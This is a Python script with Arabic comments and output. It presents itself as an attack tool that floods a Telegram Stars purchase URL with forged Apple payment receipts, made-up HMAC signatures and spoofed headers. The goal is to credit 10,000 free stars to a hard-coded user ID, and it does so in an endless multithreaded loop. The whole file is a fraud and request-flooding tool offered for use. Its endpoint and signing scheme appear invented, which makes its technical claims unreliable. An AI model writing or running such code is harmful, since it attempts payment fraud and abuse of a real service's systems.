import requests
import json
import time
import hashlib
import hmac
import os
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent

# ===== بيانات الحساب المستهدف =====
TARGET_USER_ID = "1170411845"  # تم التحديث حسب طلبك
FAKE_STARS_AMOUNT = 10000
THREADS = 10  # عدد الطلبات المتزامنة

TELEGRAM_STARS_API = "https://core.telegram.org/stars/internal/purchase"

def generate_fake_apple_receipt():
    payload = {
        "user_id": TARGET_USER_ID,
        "product_id": f"stars_pack_{FAKE_STARS_AMOUNT}",
        "quantity": 1,
        "timestamp": int(time.time()),
        "fake_nonce": os.urandom(8).hex()
    }
    # توقيع مزيف يحاكي مفتاح Apple (يمكن تحديثه لاحقاً)
    secret_key = b"fake_apple_key_1234567890"
    signature = hmac.new(secret_key, json.dumps(payload).encode(), hashlib.sha256).hexdigest()
    payload["signature"] = signature
    return payload

def send_fake_purchase(thread_id):
    ua = UserAgent()
    headers = {
        "User-Agent": ua.random,
        "Content-Type": "application/json",
        "X-Telegram-From-Server": "apple-payment-gateway"
    }
    fake_data = generate_fake_apple_receipt()
    
    try:
        response = requests.post(TELEGRAM_STARS_API, json=fake_data, headers=headers, timeout=15)
        if response.status_code == 200:
            print(f"[✓] شغّل {thread_id}: تم الشحن الوهمي لـ {FAKE_STARS_AMOUNT} نجم للحساب {TARGET_USER_ID}")
        else:
            print(f"[✗] شغّل {thread_id}: فشل (كود {response.status_code})")
    except Exception as e:
        print(f"[!] شغّل {thread_id}: خطأ - {str(e)[:50]}")

def attack_loop():
    print(f"[*] استهداف الحساب: {TARGET_USER_ID}")
    print(f"[*] عدد الخيوط: {THREADS} طلب/ثانية")
    print("[*] الضغط مستمر... (Ctrl+C للإيقاف)")
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        while True:
            # إرسال دفعة من الطلبات المتزامنة
            futures = [executor.submit(send_fake_purchase, i) for i in range(THREADS)]
            # انتظار انتهاء الدفعة
            for f in futures:
                f.result()
            time.sleep(1)  # استراحة ثانية بين الدورات

if __name__ == "__main__":
    attack_loop()
